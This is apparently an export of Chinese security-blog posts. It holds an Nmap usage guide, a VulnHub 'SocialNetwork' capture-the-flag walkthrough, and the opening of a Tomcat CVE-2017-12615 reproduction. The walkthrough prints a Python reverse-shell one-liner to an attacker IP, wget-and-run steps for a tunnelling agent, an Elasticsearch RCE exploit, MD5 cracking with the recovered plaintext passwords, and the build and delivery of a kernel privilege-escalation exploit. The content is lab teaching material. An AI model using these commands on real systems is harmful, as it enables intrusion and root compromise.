<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a><strong>功能</strong></h3><h4 id="1-主机探测"><a href="#1-主机探测" class="headerlink" title="1.主机探测"></a><strong>1.主机探测</strong></h4><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a><strong>2.<a class="link"   href="https://so.csdn.net/so/search?q=%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&spm=1001.2101.3001.7020" >端口扫描<i class="fas fa-external-link-alt"></i></a></strong></h4><h4 id="3-版本检测"><a href="#3-版本检测" class="headerlink" title="3.版本检测"></a><strong>3.版本检测</strong></h4><h4 id="4-支持探测脚本的编写"><a href="#4-支持探测脚本的编写" class="headerlink" title="4.支持探测脚本的编写"></a><strong>4.支持探测脚本的编写</strong></h4><p>​     </p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h3><h4 id="首先访问Nmap官网-http-nmap-org，获得windows对应版本的安装包。"><a href="#首先访问Nmap官网-http-nmap-org，获得windows对应版本的安装包。" class="headerlink" title="首先访问Nmap官网:http://nmap.org，获得windows对应版本的安装包。"></a><strong>首先访问Nmap官网:<a class="link"   href="http://nmap.org,获得windows对应版本的安装包./" >http://nmap.org，获得windows对应版本的安装包。<i class="fas fa-external-link-alt"></i></a></strong></h4><h4 id="因为我个人是直接拿下载好的压缩包进行解压的，所以这也是一种方法"><a href="#因为我个人是直接拿下载好的压缩包进行解压的，所以这也是一种方法" class="headerlink" title="因为我个人是直接拿下载好的压缩包进行解压的，所以这也是一种方法~"></a><strong>因为我个人是直接拿下载好的压缩包进行解压的，所以这也是一种方法~</strong></h4><h4 id="下载对应安装包后，点击安装，根据提示-一直安装即可。"><a href="#下载对应安装包后，点击安装，根据提示-一直安装即可。" class="headerlink" title="下载对应安装包后，点击安装，根据提示,一直安装即可。"></a><strong>下载对应安装包后，点击安装，根据提示,一直安装即可。</strong></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Nmap%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/1.png"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Nmap%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/2.png"
                     
                ></p>
<h4 id="选择并更改安装路径，点击安装"><a href="#选择并更改安装路径，点击安装" class="headerlink" title="选择并更改安装路径，点击安装"></a><strong>选择并更改安装路径，点击安装</strong></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Nmap%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/3.png"
                     
                ></p>
<h4 id="安装过程中可能会出现无法安装的现象，若弹窗则选择Unstall进行卸载原有软件"><a href="#安装过程中可能会出现无法安装的现象，若弹窗则选择Unstall进行卸载原有软件" class="headerlink" title="安装过程中可能会出现无法安装的现象，若弹窗则选择Unstall进行卸载原有软件"></a><strong>安装过程中可能会出现无法安装的现象，若弹窗则选择Unstall进行卸载原有软件</strong></h4><p>​            </p>
<h3 id="Nmap的基本命令以及扫描类型"><a href="#Nmap的基本命令以及扫描类型" class="headerlink" title="Nmap的基本命令以及扫描类型"></a><strong>Nmap的基本命令</strong>以及扫描类型</h3><p>  <strong>Intense scan                  nmap -T4 -A -v <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Intense scan plus UDP         nmap -sS -sU -T4 -A -v <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Intense scan, all TCP ports   nmap -p 1-65535 -T4 -A -v <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Intense scan, no ping         nmap -T4 -A -v -Pn <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Ping scan                     nmap -sn <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Quick scan                    nmap -T4 -F <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Quick scan plus               nmap -sV -T4 -O -F --version-light <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Quick traceroute              nmap -sn --traceroute <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Regular scan                  nmap <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Slow comprehensive scan       nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>​                     </p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><h4 id="Nmap是一个很好的网络探测和安全审核的工具，Nmap可以用于扫描互联网上大规模的计算机。"><a href="#Nmap是一个很好的网络探测和安全审核的工具，Nmap可以用于扫描互联网上大规模的计算机。" class="headerlink" title="Nmap是一个很好的网络探测和安全审核的工具，Nmap可以用于扫描互联网上大规模的计算机。"></a><strong>Nmap是一个很好的网络探测和安全审核的工具</strong>，<strong>Nmap可以用于扫描互联网上大规模的计算机。</strong></h4><h4 id="支持操作系统：Windows-Linux-Unix-MacOS等等；源码开放，方便移植。"><a href="#支持操作系统：Windows-Linux-Unix-MacOS等等；源码开放，方便移植。" class="headerlink" title="支持操作系统：Windows&#x2F;Linux&#x2F;Unix&#x2F;MacOS等等；源码开放，方便移植。"></a><strong>支持操作系统：Windows&#x2F;Linux&#x2F;Unix&#x2F;MacOS等等；源码开放，方便移植。</strong></h4><h4 id="目前Nmap已经被成千上万的安全专家列为必备的工具之一。"><a href="#目前Nmap已经被成千上万的安全专家列为必备的工具之一。" class="headerlink" title="目前Nmap已经被成千上万的安全专家列为必备的工具之一。"></a><strong>目前Nmap已经被成千上万的安全专家列为必备的工具之一。</strong></h4><h4 id="希望这篇文章对大家能够起到帮助！"><a href="#希望这篇文章对大家能够起到帮助！" class="headerlink" title="希望这篇文章对大家能够起到帮助！"></a><strong>希望这篇文章对大家能够起到帮助！</strong></h4>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-BoredHackerBlog:SocialNetwork通关教程</title>
    <url>/2023/09/03/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="0x01靶场下载地址"><a href="#0x01靶场下载地址" class="headerlink" title="0x01靶场下载地址"></a>0x01靶场下载地址</h1><p><a class="link"   href="https://download.vulnhub.com/boredhackerblog/medium_socnet.ova" >https://download.vulnhub.com/boredhackerblog/medium_socnet.ova<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="0x02靶机目标"><a href="#0x02靶机目标" class="headerlink" title="0x02靶机目标"></a>0x02靶机目标</h1><p>获得靶机root权限</p>
<h1 id="0x03工具准备"><a href="#0x03工具准备" class="headerlink" title="0x03工具准备"></a>0x03工具准备</h1><ul>
<li>dirsearch</li>
<li>Venom下载地址：<a class="link"   href="https://github.com/Dliv3/Venom/" >https://github.com/Dliv3/Venom/<i class="fas fa-external-link-alt"></i></a></li>
<li>MD5密码查询网站：<a class="link"   href="https://cmd5.com/" >https://cmd5.com/<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h1 id="0x04详细步骤"><a href="#0x04详细步骤" class="headerlink" title="0x04详细步骤"></a>0x04详细步骤</h1><h2 id="一、网络扫描"><a href="#一、网络扫描" class="headerlink" title="一、网络扫描"></a>一、网络扫描</h2><p>1.同网段主机扫描</p>
<blockquote>
<h5 id="arp-scan-l-I-eth1"><a href="#arp-scan-l-I-eth1" class="headerlink" title="arp-scan -l -I eth1"></a><code>arp-scan -l -I eth1</code></h5></blockquote>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903094754185.png"
                      alt="image-20230903094754185"
                ></p>
<p>2.对目标靶机进行全端口扫描</p>
<h5 id="nmap-p-192-168-56-101"><a href="#nmap-p-192-168-56-101" class="headerlink" title="nmap -p- 192.168.56.101"></a><code>nmap -p- 192.168.56.101</code></h5><p>3.识别靶机端口开放的服务</p>
<h5 id="nmap-p-22-5000-sV-192-168-56-101"><a href="#nmap-p-22-5000-sV-192-168-56-101" class="headerlink" title="nmap -p 22,5000 -sV  192.168.56.101"></a><code>nmap -p 22,5000 -sV  192.168.56.101</code></h5><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903095042766.png"
                      alt="image-20230903095042766"
                ></p>
<p>发现TCP5000端口，开放有Python2，Web服务</p>
<h2 id="二、Web信息收集"><a href="#二、Web信息收集" class="headerlink" title="二、Web信息收集"></a>二、Web信息收集</h2><p>1.用浏览器访问<a href="http://192.168.56.101:5000，但在页面上并没有发现有用的信息">http://192.168.56.101:5000，但在页面上并没有发现有用的信息</a></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903095155501.png"
                      alt="image-20230903095155501"
                ></p>
<p>2.对<a href="http://192.168.56.101:5000进行目录扫描">http://192.168.56.101:5000进行目录扫描</a></p>
<h5 id="dirsearch-u-http-192-168-56-101-5000"><a href="#dirsearch-u-http-192-168-56-101-5000" class="headerlink" title="dirsearch -u http://192.168.56.101:5000"></a><code>dirsearch -u http://192.168.56.101:5000</code></h5><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903095407488.png"
                      alt="image-20230903095407488"
                ></p>
<p>发现&#x2F;admin目录进行访问</p>
<h2 id="三、Web-命令执行漏洞与反弹Shell"><a href="#三、Web-命令执行漏洞与反弹Shell" class="headerlink" title="三、Web 命令执行漏洞与反弹Shell"></a>三、Web 命令执行漏洞与反弹Shell</h2><p>1.浏览器访问<a class="link"   href="http://192.168.56.101:5000/admin%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4" >http://192.168.56.101:5000/admin，发现可以执行命令<i class="fas fa-external-link-alt"></i></a></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903095528066.png"
                      alt="image-20230903095528066"
                ></p>
<p>2.使用Python反弹shell</p>
<ul>
<li><p>使用nc在Kali主机上监听TCP8686端口(端口任意指定)</p>
</li>
<li><h6 id="nc-nvlp-8686"><a href="#nc-nvlp-8686" class="headerlink" title="nc -nvlp 8686"></a><code>nc -nvlp 8686</code></h6></li>
<li><p>在<a class="link"   href="http://192.168.56.101:5000/admin%E8%BE%93%E5%85%A5Python" >http://192.168.56.101:5000/admin输入Python<i class="fas fa-external-link-alt"></i></a> Shell</p>
</li>
</ul>
<h6 id="import-socket-subprocess-os-s-socket-socket-socket-AF-INET-socket-SOCK-STREAM-s-connect-192-168-56-102-8686-os-dup2-s-fileno-0-os-dup2-s-fileno-1-os-dup2-s-fileno-2-p-subprocess-call-bin-sh-i"><a href="#import-socket-subprocess-os-s-socket-socket-socket-AF-INET-socket-SOCK-STREAM-s-connect-192-168-56-102-8686-os-dup2-s-fileno-0-os-dup2-s-fileno-1-os-dup2-s-fileno-2-p-subprocess-call-bin-sh-i" class="headerlink" title="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,8686));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);"></a><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,8686));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903095747510.png"
                      alt="image-20230903095747510"
                ></p>
<p>Tip:判断主机位Docker容器的两种方法<br>方法一:确认根目录下是否存在.dockerenv文件</p>
<h6 id="ls-dockerenv"><a href="#ls-dockerenv" class="headerlink" title="ls /.dockerenv"></a><code>ls /.dockerenv</code></h6><p>方法二:查看&#x2F;proc&#x2F;1&#x2F;cgroup是否存在docker目录</p>
<h6 id="cat-proc-1-cgroup"><a href="#cat-proc-1-cgroup" class="headerlink" title="cat /proc/1/cgroup"></a><code>cat /proc/1/cgroup</code></h6><h2 id="四、内网穿透"><a href="#四、内网穿透" class="headerlink" title="四、内网穿透"></a>四、内网穿透</h2><p>1.内网扫描</p>
<ul>
<li>ip address 发现内网段为172.17.0.3&#x2F;16网段</li>
<li>内网主机扫描，发现172.17.0.1，172.17.0.2，172.17.0.3为存活主机</li>
</ul>
<h6 id="for-i-in-seq-1-254-do-ping-c-1-172-17-0-i-done"><a href="#for-i-in-seq-1-254-do-ping-c-1-172-17-0-i-done" class="headerlink" title="for i in $(seq 1 254); do ping -c 1 172.17.0.$i; done"></a><code>for i in $(seq 1 254); do ping -c 1 172.17.0.$i; done</code></h6><p>2.部署Venom内网穿透工具</p>
<ul>
<li>在Kali主机Venom目录启动Python3 Http Server</li>
</ul>
<h6 id="python3-m-http-server-80"><a href="#python3-m-http-server-80" class="headerlink" title="python3 -m http.server 80"></a><code>python3 -m http.server 80</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903100024734.png"
                      alt="image-20230903100024734"
                ></p>
<ul>
<li><p>启动Venom管理端，监听本地9999端口</p>
</li>
<li><h6 id="admin-linux-x64-lport-9999"><a href="#admin-linux-x64-lport-9999" class="headerlink" title="./admin_linux_x64 -lport 9999"></a><code>./admin_linux_x64 -lport 9999</code></h6></li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903100148187.png"
                      alt="image-20230903100148187"
                ></p>
<ul>
<li>靶机部署Venom客户端</li>
</ul>
<h6 id="cd-tmp"><a href="#cd-tmp" class="headerlink" title="cd /tmp"></a><code>cd /tmp</code></h6><h6 id="wget-c-http-192-168-56-101-agent-linux-x64"><a href="#wget-c-http-192-168-56-101-agent-linux-x64" class="headerlink" title="wget -c http://192.168.56.101/agent_linux_x64"></a><code>wget -c http://192.168.56.101/agent_linux_x64</code></h6><h6 id="chmod-x-agent-linux-x64"><a href="#chmod-x-agent-linux-x64" class="headerlink" title="chmod +x agent_linux_x64"></a><code>chmod +x agent_linux_x64</code></h6><h6 id="agent-linux-x64-rhost-192-168-56-101-rport-9999"><a href="#agent-linux-x64-rhost-192-168-56-101-rport-9999" class="headerlink" title="./agent_linux_x64 -rhost 192.168.56.101 -rport 9999"></a><code>./agent_linux_x64 -rhost 192.168.56.101 -rport 9999</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903100352086.png"
                      alt="image-20230903100352086"
                ></p>
<p>在Kali主机Venom管理端可以看到有主机上线</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903100456043.png"
                      alt="image-20230903100456043"
                ></p>
<p>查看、控制Venom节点、启动socks隧道</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903100429613.png"
                      alt="image-20230903100429613"
                ></p>
<h2 id="五、挂Socks内网扫描"><a href="#五、挂Socks内网扫描" class="headerlink" title="五、挂Socks内网扫描"></a>五、挂Socks内网扫描</h2><p>1.修改proxychains配置</p>
<h6 id="vi-etc-proxychains4-conf"><a href="#vi-etc-proxychains4-conf" class="headerlink" title="vi /etc/proxychains4.conf"></a><code>vi /etc/proxychains4.conf</code></h6><p>修改最后一行为：<br>socks5  127.0.0.1 1080</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903100625047.png"
                      alt="image-20230903100625047"
                ></p>
<p>2.挂代理启动扫描，发现172.17.0.1，172.17.0.3相同，172.17.0.2存在9200端口</p>
<h6 id="proxychains-nmap-Pn-sT-sV-172-17-0-1"><a href="#proxychains-nmap-Pn-sT-sV-172-17-0-1" class="headerlink" title="proxychains nmap -Pn -sT -sV 172.17.0.1"></a><code>proxychains nmap -Pn -sT -sV 172.17.0.1</code></h6><h6 id="proxychains-nmap-Pn-sT-sV-172-17-0-2"><a href="#proxychains-nmap-Pn-sT-sV-172-17-0-2" class="headerlink" title="proxychains nmap -Pn -sT -sV 172.17.0.2"></a><code>proxychains nmap -Pn -sT -sV 172.17.0.2</code></h6><h6 id="proxychains-nmap-Pn-sT-sV-172-17-0-3"><a href="#proxychains-nmap-Pn-sT-sV-172-17-0-3" class="headerlink" title="proxychains nmap -Pn -sT -sV 172.17.0.3"></a><code>proxychains nmap -Pn -sT -sV 172.17.0.3</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903100723288.png"
                      alt="image-20230903100723288"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903100759509.png"
                      alt="image-20230903100759509"
                ></p>
<h2 id="六、利用Elasticsearch获取目标靶机登录用户名和密码"><a href="#六、利用Elasticsearch获取目标靶机登录用户名和密码" class="headerlink" title="六、利用Elasticsearch获取目标靶机登录用户名和密码"></a>六、利用Elasticsearch获取目标靶机登录用户名和密码</h2><p>1.搜索Elasticsearch漏洞</p>
<h6 id="searchsploit-Elasticsearch"><a href="#searchsploit-Elasticsearch" class="headerlink" title="searchsploit Elasticsearch"></a><code>searchsploit Elasticsearch</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903100856700.png"
                      alt="image-20230903100856700"
                ></p>
<p>2.复制36337.py到当前目录，通过查看该python脚本得知该使用python2</p>
<h6 id="cp-usr-share-exploitdb-exploits-linux-remote-36337-py"><a href="#cp-usr-share-exploitdb-exploits-linux-remote-36337-py" class="headerlink" title="cp /usr/share/exploitdb/exploits/linux/remote/36337.py ."></a><code>cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</code></h6><p>3.向Elasticsearch写入一条数据（如果不写入数据，攻击代码无法执行）</p>
<h6 id="proxychains-curl-XPOST-172-17-0-2-9200-twitter-user-yren-d-name-hgd"><a href="#proxychains-curl-XPOST-172-17-0-2-9200-twitter-user-yren-d-name-hgd" class="headerlink" title="proxychains curl -XPOST &#39;172.17.0.2:9200/twitter/user/yren&#39; -d &#39;{&quot;name&quot;:&quot;hgd&quot;}&#39;"></a><code>proxychains curl -XPOST &#39;172.17.0.2:9200/twitter/user/yren&#39; -d &#39;&#123;&quot;name&quot;:&quot;hgd&quot;&#125;&#39;</code></h6><p>4.挂proxychains攻击172.17.0.2 9200端口</p>
<h6 id="proxychains-python2-36337-py-172-17-0-2"><a href="#proxychains-python2-36337-py-172-17-0-2" class="headerlink" title="proxychains python2 36337.py  172.17.0.2"></a><code>proxychains python2 36337.py  172.17.0.2</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903101140880.png"
                      alt="image-20230903101140880"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903101201595.png"
                      alt="image-20230903101201595"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903101241306.png"
                      alt="image-20230903101241306"
                ></p>
<p>5.查询用户身份,发现是root权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903101319419.png"
                      alt="image-20230903101319419"
                ></p>
<p>6.在根目录下发现passwords文件，内含用户名一些用户名和密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903101344802.png"
                      alt="image-20230903101344802"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903101427727.png"
                      alt="image-20230903101427727"
                ></p>
<p>7.破解MD5加密明文(两种方法)</p>
<p>​       方法一:使用Hashcat破解</p>
<ul>
<li><p>根据Format提示，密码是由8位组成，前四位是数字，后四位是小写字母，可以是用Hashcat</p>
<ol>
<li>把hash提取出来，保存为一个文件pwd.hash</li>
<li>-m 0 指哈希类型是md5；-a 3 指掩码攻击；?d代表数字；?l代表小写字母</li>
</ol>
<p>cat pwd.hash<br>john:3f8184a7343664553fcb5337a3138814<br>test:861f194e9d6118f3d942a72be3e51749<br>admin:670c3bbc209a18dde5446e5e6c1f1d5b<br>root:b3d34352fc26117979deabdf1b9b6354<br>jane:5c158b60ed97c723b673529b8a3cf72b<br>hashcat –username -m 0 -a 3 pwd.hash ?d?d?d?d?l?l?l?l –force<br>hashcat –username -m 0 -a 3 pwd.hash ?d?d?d?d?l?l?l?l –force –show<br>john:3f8184a7343664553fcb5337a3138814:1337hack<br>test:861f194e9d6118f3d942a72be3e51749:1234test<br>admin:670c3bbc209a18dde5446e5e6c1f1d5b:1111pass<br>root:b3d34352fc26117979deabdf1b9b6354:1234pass<br>jane:5c158b60ed97c723b673529b8a3cf72b:1234jane</p>
<p>方法二:使用第三方密码查询平台（如：<a class="link"   href="https://www.somd5.com/%EF%BC%89%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81" >https://www.somd5.com/）获取明文密码<i class="fas fa-external-link-alt"></i></a></p>
<ol>
<li><p>通过依次尝试，john:1337hack可以登录目标靶机</p>
</li>
<li><p>通过依次尝试，john:1337hack可以登录目标靶机</p>
</li>
</ol>
</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903101444851.png"
                      alt="image-20230903101444851"
                ></p>
<p>8.通过依次尝试，john:1337hack可以登录目标靶机</p>
<p>ssh <a class="link"   href="mailto:&#106;&#x6f;&#104;&#110;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#53;&#x36;&#46;&#49;&#x30;&#49;" >&#106;&#x6f;&#104;&#110;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#53;&#x36;&#46;&#49;&#x30;&#49;<i class="fas fa-external-link-alt"></i></a></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903101928139.png"
                      alt="image-20230903101928139"
                ></p>
<h2 id="七、Linux内核提权"><a href="#七、Linux内核提权" class="headerlink" title="七、Linux内核提权"></a>七、Linux内核提权</h2><p>1.尝试john用户提权，但提权失败</p>
<h6 id="sudo-s-约等于sudo-su"><a href="#sudo-s-约等于sudo-su" class="headerlink" title="sudo -s     //约等于sudo su"></a><code>sudo -s     //约等于sudo su</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903102058611.png"
                      alt="image-20230903102058611"
                ></p>
<p>2.尝试内核提权</p>
<h6 id="uname-a"><a href="#uname-a" class="headerlink" title="uname -a"></a><code>uname -a</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903102144832.png"
                      alt="image-20230903102144832"
                ></p>
<ul>
<li>搜索关键字</li>
</ul>
<h6 id="1"><a href="#1" class="headerlink" title="1"></a><code>1</code></h6><p> 考虑到</p>
<h6 id="cp-usr-share-exploitdb-exploits-linux-local-37292-c"><a href="#cp-usr-share-exploitdb-exploits-linux-local-37292-c" class="headerlink" title="cp /usr/share/exploitdb/exploits/linux/local/37292.c ."></a><code>cp /usr/share/exploitdb/exploits/linux/local/37292.c .</code></h6><h6 id="注释掉37292-c的139-147行"><a href="#注释掉37292-c的139-147行" class="headerlink" title="注释掉37292.c的139-147行"></a><code>注释掉37292.c的139-147行</code></h6><h6 id="gcc-o-exp-37292-c"><a href="#gcc-o-exp-37292-c" class="headerlink" title="gcc -o exp 37292.c"></a><code>gcc -o exp 37292.c</code></h6><h6 id="locate-ofs-lib-so"><a href="#locate-ofs-lib-so" class="headerlink" title="locate ofs-lib.so"></a><code>locate ofs-lib.so</code></h6><h6 id="cp-usr-share-metasploit-framework-data-exploits-CVE-2015-1328-ofs-lib-so"><a href="#cp-usr-share-metasploit-framework-data-exploits-CVE-2015-1328-ofs-lib-so" class="headerlink" title="cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so ."></a><code>cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903102720275.png"
                      alt="image-20230903102720275"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903102747231.png"
                      alt="image-20230903102747231"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903102858394.png"
                      alt="image-20230903102858394"
                ></p>
<ul>
<li>将编译好的exp和ofs-lib.so上传至目标靶机</li>
</ul>
<p>kali主机在tmp目录启动http server</p>
<h6 id="python3-m-http-server-80-1"><a href="#python3-m-http-server-80-1" class="headerlink" title="python3 -m http.server 80"></a><code>python3 -m http.server 80</code></h6><p>在靶机上下载exp和ofs-lib.so</p>
<h6 id="cd-tmp-1"><a href="#cd-tmp-1" class="headerlink" title="cd /tmp"></a><code>cd /tmp</code></h6><p>wget <a class="link"   href="http://192.168.56.102/exp" >http://192.168.56.102/exp<i class="fas fa-external-link-alt"></i></a><br>wget <a class="link"   href="http://192.168.56.102/ofs-lib.so" >http://192.168.56.102/ofs-lib.so<i class="fas fa-external-link-alt"></i></a></p>
<p>执行<code>exp</code>文件,提权成功</p>
<h6 id="chmod-x-exp"><a href="#chmod-x-exp" class="headerlink" title="chmod +x exp"></a><code>chmod +x exp</code></h6><h6 id="exp"><a href="#exp" class="headerlink" title="./exp"></a><code>./exp</code></h6><h6 id="id"><a href="#id" class="headerlink" title="id"></a><code>id</code></h6><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/SocialNetwork%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/image-20230903103236946.png"
                      alt="image-20230903103236946"
                ></p>
<ul>
<li>如果运行exp报错，gcc或者glibc有关系，用docker拉个homebrew&#x2F;ubuntu16.04，在这里面编译就行了,感谢大家观看！</li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat文件上传(CVE-2017-12615)漏洞复现</title>
    <url>/2023/08/24/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2017-12615)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><em><strong>1、启动环境</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps1.jpg"
                      alt="img"
                > </p>
<p><em><strong>2、打开Burpsuite进行抓包，点击网页刷新</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps2.jpg"
                      alt="img"
                > </p>
